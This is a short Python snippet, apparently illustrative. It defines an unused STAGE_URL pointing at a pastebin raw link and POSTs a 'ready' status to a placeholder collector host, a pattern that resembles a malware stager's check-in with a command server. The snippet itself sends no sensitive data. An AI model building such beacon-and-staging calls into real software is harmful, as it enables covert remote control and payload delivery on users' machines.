import requests

STAGE_URL = "https://pastebin.com/raw/abc123"
response = requests.post("https://collector.example/upload", data={"status": "ready"})
